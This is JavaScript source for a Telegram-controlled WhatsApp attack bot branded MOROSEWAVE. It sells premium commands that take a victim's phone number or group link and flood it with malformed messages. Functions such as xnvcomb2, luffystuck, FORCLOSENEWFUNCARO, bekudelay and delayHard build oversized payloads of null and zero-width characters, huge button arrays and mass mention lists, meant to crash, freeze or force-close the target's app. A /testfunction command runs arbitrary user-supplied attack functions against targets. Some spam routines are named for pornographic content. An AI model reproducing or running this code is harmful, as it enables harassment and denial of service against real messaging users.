bot.command("Xscreen", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xscreen 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await monkey(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("Xengine", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xengine 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await Luffyblenk(sock, target);
    await sleep(1200);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("Xbuldo", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xbuldo 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 55; i++) {
    await CongXRexccdozer(sock, target);
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

//CASE BUG CAN SPAM TARGET
bot.command("Xspamv1", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xspamv1 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await dileyspam(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("Xspamv2", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xspamv2 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await VnFDelaySpamBokep(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("Xspamv3", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xspamv3 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await VnFDelaySpamPorno(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("Xspamv4", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xspamv4 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 30; i++) {
    await delaysspam(sock, target, loop = 30);
    await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("Xspamv5", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xspamv5 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await Luffyblenk(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("Xspamv6", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xspamv6 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 5; i++) {
    await CongXRexccdozer(sock, target);
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | V29.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

//CASE BUG GROUP
bot.command('Xbans', async (ctx) => {
  const chatId = ctx.chat.id;
  const link = ctx.message.text.split(' ').slice(1).join(' ');

  if (!checkWhatsAppConnection(ctx)) return;

  if (!link) {
    return ctx.reply(
      `🪧 *Format:* /Xbans https://chat.whatsapp.com/xxxxxx`,
      { parse_mode: "Markdown" }
    );
  }

  const inviteCode = extractInviteCode(link);

  if (!inviteCode) {
    return ctx.reply(
      `❌ *Link tidak valid!* Pastikan link undangan grup WhatsApp.`,
      { parse_mode: "Markdown" }
    );
  }

  const processMessage = await ctx.replyWithVideo(
    thumbnailURL,
    {
      caption: `
<blockquote><pre>Ban Group</pre></blockquote>
⌑ Target Grup: ${inviteCode}
⌑ Type: Auto Join + Group Ban
⌑ Status: <b>🔄 Processing...</b>
`,
      parse_mode: "HTML"
    }
  );

  const processMsgId = processMessage.message_id;

  try {
    const target = await sock.groupAcceptInvite(inviteCode);

    if (!target) {
      return;
    }

    await ctx.editMessageCaption(
      `
<blockquote><pre>Ban Group</pre></blockquote>
⌑ Target Grup: ${inviteCode}
⌑ Type: Auto Join + Group Ban
⌑ Status: <b>✅ Success</b>
`,
      { chat_id: chatId, message_id: processMsgId, parse_mode: "HTML" }
    );

    await GroupBan1(sock, target);

    await ctx.editMessageCaption(
      `
<blockquote><pre>Ban Group</pre></blockquote>
⌑ Target Grup: ${inviteCode}
⌑ Type: Auto Join + Group Ban
⌑ Status: <b>✅ Done</b>
`,
      { chat_id: chatId, message_id: processMsgId, parse_mode: "HTML" }
    );

  } catch (err) {
    return;
  }
});

//END CASE BUG

bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 5 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 500))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<pre><code class="language-javascript">⟡━⟢ MoroseWave ⟣━⟡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "🔍 Cek Target", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<pre><code class="language-javascript">⟡━⟢ MoroseWave ⟣━⟡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success
╘═——————————————═⬡</code></pre>`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "CEK TARGET", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "CEK TARGET", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)
//FUNCTION BUG NUMBER TARGET//
//crashhome
async function xnvcomb2(sock, target) {
  try {
    const typ = "moro".repeat(20000);

    await sock.relayMessage(target, {
      interactiveMessage: {
        body: {
          text: typ
        },
        nativeFlowMessage: {
          buttons: "[".repeat(50001)
        },
        contextInfo: {
          mentionedJid: [target],
          isForwarded: true,
          forwardingScore: 999
        }
      }
    }, {});

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "\x10".repeat(500000),
              title: "\r".repeat(2000),
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              buttons: Array.from({ length: 500000 }, () => ({}))
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1999 }, () =>
                  "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                )
              ]
            },
            viewOnceMessage: {
              message: {
                text: "\u0000".repeat(50000)
              }
            }
          }
        }
      }
    }, {});

    console.log("✅ MOROSEWAVE SENT!");
  } catch (e) {
    console.log("❌ ERROR: MORO", e.message);
  }
}
//stuck home
async function luffystuck(sock, target) {
    const msg1 = "\u0000".repeat(30000);
    const msg2 = "\x2134".repeat(30000);
    const msg3 = "\x2134".repeat(30000);
    const msg4 = "\u0923".repeat(30000);

    const L = {
        imageMessage: {
            annotations: [
                {
                    shouldSkipConfirmation: true,
                    embeddedContent: {
                        embeddedMusic: {
                            musicContentMediaId: "1076271414767155",
                            songId: "2010524146436347",
                            author: "Corduroy Egg",
                            title: "Dog Days",
                            artworkDirectPath: "/v/t62.76458-24/573843414_4508294349496159_6974649127990762489_n.enc?ccb=11-4&oh=01_Q5Aa5AFMeUPKs7Ib70fbMzJB8ZtqTvN_le7NwuEc4edgERrMgg&oe=6A78543B&_nc_sid=5e03e0",
                            artworkSha256: "7iV8ObENtXUZim80Wse28hn+ihhELNfftpC1iQ5fjlU=",
                            artworkEncSha256: "NhRAxAsqyLR/Iz9DW4aSt+MQGTGgFJpgcOHFF4viQV8=",
                            artistAttribution: "https://www.instagram.com/_u/corduroyeggbeats",
                            countryBlocklist: "",
                            isExplicit: false,
                            artworkMediaKey: "qdgtp7pboqbA2b8qxThpTiTAv9lpxHsPU0sKJfIs1ok="
                        }
                    },
                    embeddedAction: true
                }
            ],
            externalShareFullVideoDurationInSeconds: 0
        }
    };

    const L2 = {
        viewOnceMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "moro"
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "payment_key_info",
                                buttonParamsJson: JSON.stringify({
                                    currency: "IDR",
                                    total_amount: { value: 0, offset: 100 },
                                    reference_id: "4VNVVXDQHTP",
                                    type: "physical-goods",
                                    order: {
                                        status: "pending",
                                        subtotal: { value: 0, offset: 100 },
                                        order_type: "ORDER",
                                        items: [
                                            {
                                                name: "",
                                                amount: { value: 0, offset: 100 },
                                                quantity: 0,
                                                sale_amount: { value: 0, offset: 100 }
                                            }
                                        ]
                                    },
                                    payment_settings: [
                                        {
                                            type: "payment_key",
                                            payment_key: {
                                                type: "IDPAYMENTACCOUNT",
                                                key: "08594376837",
                                                name: "Bank Central Asia",
                                                institution_name: "Bank Central Asia",
                                                full_name_on_account: "SATZ"
                                            }
                                        }
                                    ],
                                    share_payment_status: false,
                                    is_soft_deleted: false,
                                    referral: "chat_attachment"
                                })
                            }
                        ]
                    }
                }
            }
        }
    };

    const L3 = {
        interactiveMessage: {
            body: {
                text: "\x2134".repeat(60000) + "\u0923".repeat(30000)
            },
            nativeFlowMessage: {
                buttons: "one_crash_message".repeat(20000) + "\u200B".repeat(30000)
            }
        }
    };

    const L4 = {
        interactiveMessage: {
            body: { text: "moro" },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "booking_confirm",
                        buttonParamsJson: JSON.stringify({
                            display_text: "\u200B",
                            phone_number: "62×××××××",
                            booking_id: "confirm",
                            status: "succes",
                            customer_name: "LUFFY",
                            amount: "100"
                        })
                    }
                ],
                version: 99
            }
        }
    };

    const L5 = {
        viewOnceMessage: {
            body: {
                text: "moro",
                display_text: "\u200C".repeat(60000),
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: "voice_call",
                            display_text: "\u200B",
                            phone_number: "62×××××××"
                        }
                    ]
                }
            }
        }
    };

    const L6 = {
        interactiveMessage: {
            body: { text: "moro" },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "order_status",
                        buttonParamsJson: JSON.stringify({
                            reference_id: "PL-" + Date.now(),
                            order: {
                                status: "PROCESSING",
                                currency: "IDR",
                                subtotal: { value: 10000, offset: 100 },
                                tax: { value: 0, offset: 100 },
                                shipping: { value: 0, offset: 100 },
                                discount: { value: 0, offset: 100 },
                                total: { value: 10000, offset: 100 },
                                items: [
                                    {
                                        name: "\0".repeat(100000),
                                        quantity: 1,
                                        amount: { value: 10000, offset: 100 },
                                        sale_amount: { value: 10000, offset: 100 }
                                    }
                                ]
                            }
                        })
                    }
                ],
                messageParamsJson: "{".repeat(10000)
            }
        }
    };

    const L7 = {
        interactiveMessage: {
            body: {
                text: "moro"
            },
            nativeFlowMessage: {
                extra: "\u31040",
                buttons: "A".repeat(20000),
                buttons: Array.from({ length: 50001 }, () => ({}))
            }
        }
    };

    const L8 = {
        richResponseMessage: {
            interactiveMessage: {
                body: {
                    text: "moro"
                },
                nativeFlowMessage: {
                    name: "valid_booking_mesaage",
                    extra1: "\u0000".repeat(20000),
                    extra2: "\u0000".repeat(10000),
                    extra3: "\u0000".repeat(30000)
                }
            },
            messageType: 1,
            submessages: [
                {
                    messageType: 8,
                    latexMetadata: {
                        text: "\0",
                        expressions: [
                            {
                                latexExpression: "\0",
                                width: 99999999
                            }
                        ]
                    }
                }
            ],
            contextInfo: {
                isForwarded: true,
                forwardOrigin: 4
            }
        }
    };

    await sock.relayMessage(target, L, {
        participant: { jid: target }
    });

    await sock.relayMessage(target, L2, {
        participant: { jid: target }
    });

    await sock.relayMessage(target, L3, {
        participant: { jid: target }
    });

    await sock.relayMessage(target, L4, {
        participant: { jid: target }
    });

    await sock.relayMessage(target, L5, {
        participant: { jid: target }
    });

    await sock.relayMessage(target, L6, {
        participant: { jid: target }
    });

    await sock.relayMessage(target, L7, {
        participant: { jid: target }
    });

    await sock.relayMessage(target, L8, {
        participant: { jid: target }
    });
}
//force click
async function FORCLOSENEWFUNCARO(sock, target) {
  try {
    const s = async (m) => sock.relayMessage(target, m, { participant: { jid: target } });
    const r = (str, n) => str.repeat(n);
    const a = (n, fn) => Array.from({ length: n }, fn);
    
    await s({
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: r("\r", 25000) + r("\u0000", 30000) + r("\u200B", 30000),
              format: "DEFAULT"
            },
            nativeFlowMessage: {
              buttons: a(500000, () => ({}))
            },
            contextInfo: {
              mentionedJid: a(100, (_, i) => String(i + 1) + "@s.whatsapp.net"),
              expiration: 1,
              ephemeralSettingTimestamp: 1
            }
          }
        }
      }
    });
    console.log("[+] SUKSES SEND TO", target);

    await s({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "moro" + r("\u0000", 30000),
              extra: r("\u31040", 1000)
            },
            nativeFlowMessage: {
              extra: r("\u31040", 1000),
              buttons: r("A", 20000),
              extra1: r("\u0000", 80000),
              extra2: r("\u0000", 50000)
            },
            contextInfo: {
              mentionedJid: a(500, () => String(Math.floor(Math.random() * 9999)) + "@s.whatsapp.net"),
              expiration: 1,
              ephemeralSettingTimestamp: 1
            }
          }
        }
      }
    });
    console.log("[+] SUKSES SEND TO", target);

    await s({
      interactiveMessage: {
        body: {
          text: "moro" + r("\u0000", 30000),
          format: "DEFAULT"
        },
        nativeFlowMessage: {
          buttons: r("\u0300", 500000)
        },
        contextInfo: {
          mentionedJid: a(200, (_, i) => String(i + 100) + "@s.whatsapp.net"),
          expiration: 1,
          ephemeralSettingTimestamp: 1
        }
      }
    });
    console.log("[+] BERHASIL SEND TO", target);

    await s({
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: "moro" + r("\u1A01", 30000) + r("\u1A00", 30000),
              format: "DEFAULT"
            },
            nativeFlowMessage: {
              buttons: a(500000, () => ({}))
            },
            contextInfo: {
              mentionedJid: a(300, (_, i) => String(i + 200) + "@s.whatsapp.net"),
              expiration: 1,
              ephemeralSettingTimestamp: 1
            }
          }
        }
      }
    });
    console.log("[+] BERHASIL SEND TO", target);

    console.log("[+] SUKSES SEND TO", target);
  } catch (e) {
    console.log("[-] Error IN FUNCT:", e.message || e);
  }
}

//beku invis
async function bekudelay(sock, target) {
  try {
    const msg = {
      interactiveMessage: {
        body: {
          text: "moro"
        },
        nativeFlowMessage: {
          buttons: "\0".repeat(230000) + " .repeat(2000) " +
                   " repeat(20000) " +
                   " meta_mesaage) " +
                   " repeat(1000)" +
                   "crash_mesage"
        }
      }
    };
    await sock.relayMessage(target, msg, {});

    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          stickerPackMessage: {
            stickerPackId: "\0".repeat(1000),
            name: "Exposed",
            publisher: "\0".repeat(1000),
            fileLength: 9999,
            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
            mimetype: "image/webp",
            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
            contextInfo: {
              statusAttributionType: 2,
              statusAttributions: Array.from({ length: 200000 }, () => ({ type: 1 }))
            }
          }
        }
      }
    }, {});

    console.log("✅ kontol anj SENT!");
  } catch (e) {
    console.log("❌ ERROR", e.message);
  }
}
//crash invisible
async function luffycrash(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\u0000".repeat(60000),
                        format: "DEFAULT"
                    },
                    nativeFlowMessage: {
                        buttons: "valid_end_message".repeat(20000) + "\u200B".repeat(30000),
                        nativeFlowResponsMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        }
                    }
                }
            }
        }
    };

    const msg2 = {
        interactiveMessage: {
            body: {
                text: "\u0000".repeat(60000),
                format: "DEFAULT"
            },
            nativeFlowMessage: {
                buttons: "voice_call".repeat(20000) + "\u200B".repeat(30000)
            }
        }
    };

    await sock.relayMessage(target, msg, {
        participant: { jid: target }
    });

    await sock.relayMessage(target, msg2, {
        participant: { jid: target }
    });
}
//delay x freeze
async function XcrashXi(sock, target) {
  try {
    const payload = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: "moro" + "\u7077".repeat(77777),
            },
            nativeFlowMessage: {
              buttons: "invite_number_status".repeat(20000),
            },
          },
        },
      },
    };

    await sock.relayMessage(target, payload, {
      participants: {
        jid: target,
      },
    });
  } catch (err) {
    console.error("❌ Error:", err.message);
  }
}
//delay hard invisible
async function delayHard(sock, target) {
  try {
    const s = async (m) => sock.relayMessage(target, m, { participant: { jid: target } });
    const r = (str, n) => str.repeat(n);
    const a = (n, fn) => Array.from({ length: n }, fn);
    const d = (ms) => new Promise(res => setTimeout(res, ms));

    await s({
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            text: "ꦭꦮꦯꦰꦱꦲ",
            contentText: "ꦭꦮꦯꦰꦱꦲ" + "\uA9BD".repeat(90000),
            contextInfo: {
              forwardingScore: 6,
              isForwarded: true,
              entryPointConversionSource: "global_search_new_chat",
              entryPointConversionApp: "com.whatsapp",
              entryPointConversionDelaySeconds: 1,
              externalAdReply: {
                title: "\u0000",
                body: "Eu " + "x10".repeat(9200),
                previewType: "PHOTO",
                thumbnail: null,
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "https://t.me/XemzzSolo"
              },
              urlTrackingMap: {
                urlTrackingMapElements: [
                  { originalUrl: "https://t.me/XemzzSolo", unconsentedUsersUrl: "https://t.me/XemzzSolo", consentedUsersUrl: "https://t.me/XemzzSolo", cardIndex: 1 },
                  { originalUrl: "https://t.me/XemzzSolo", unconsentedUsersUrl: "https://t.me/XemzzSolo", consentedUsersUrl: "https://t.me/XemzzSolo", cardIndex: 2 }
                ]
              }
            },
            headerType: 1
          }
        }
      }
    });
    console.log("[+] delayHard payload 1 ke", target);
    await d(2000);

    await s({
      interactiveMessage: {
        body: { text: "moro" + r("\u0000", 30000), format: "DEFAULT" },
        nativeFlowMessage: { buttons: r("\uA99E", 500000) },
        contextInfo: { mentionedJid: a(100, (_, i) => String(i + 1) + "@s.whatsapp.net"), expiration: 1, ephemeralSettingTimestamp: 1 }
      }
    });
    console.log("[+] send bug to", target);
    await d(2000);

    await s({
      interactiveMessage: {
        body: { text: "moro" + r("\u2069", 50000) + r("\u0000", 30000), format: "DEFAULT" },
